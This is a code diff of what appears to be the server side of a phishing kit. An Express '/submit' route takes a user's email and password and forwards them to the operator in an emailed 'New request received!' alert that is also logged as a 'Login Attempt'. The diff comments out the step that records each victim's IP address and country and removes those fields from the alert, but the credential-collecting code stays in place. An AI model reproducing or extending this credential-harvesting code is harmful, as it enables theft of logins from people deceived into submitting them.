@@ -60,8 +60,6 @@ async function sendEmailNotification(email, encryptedPassword, ip, country) {
       text: `📧 New request received!
 👤 Email: ${email}
 🔐 Encrypted Password: ${encryptedPassword}
-🌍 IP Address: ${ip}
-🏳 Country: ${country}
 📅 Time: ${new Date().toLocaleString()}`,
     });
     console.log("✅ Email sent successfully!");
@@ -84,19 +82,19 @@ app.post("/submit", async (req, res) => {
     const encryptedPassword = encryptPassword(password);
 
     // 🔥 Get user's IP from the request headers (fallback to 'Unknown IP' if missing)
-    const userIP =
-      req.headers["x-forwarded-for"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
+    // const userIP =
+    //   req.headers["x-forwarded-for"] ||
+    //   req.connection.remoteAddress ||
+    //   "Unknown IP";
 
-    // 🔥 Get the country name from the IP
-    const country = await getCountryFromIP(userIP);
+    // // 🔥 Get the country name from the IP
+    // const country = await getCountryFromIP(userIP);
 
-    // 🔥 Log IP and country in the console
-    console.log(`🌍 Login Attempt from ${userIP} (${country})`);
+    // // 🔥 Log IP and country in the console
+    // console.log(`🌍 Login Attempt from ${userIP} (${country})`);
 
     // 🔥 Send email notification
-    await sendEmailNotification(email, encryptedPassword, userIP, country);
+    await sendEmailNotification(email, encryptedPassword);
 
     res.json({
       status: "success",
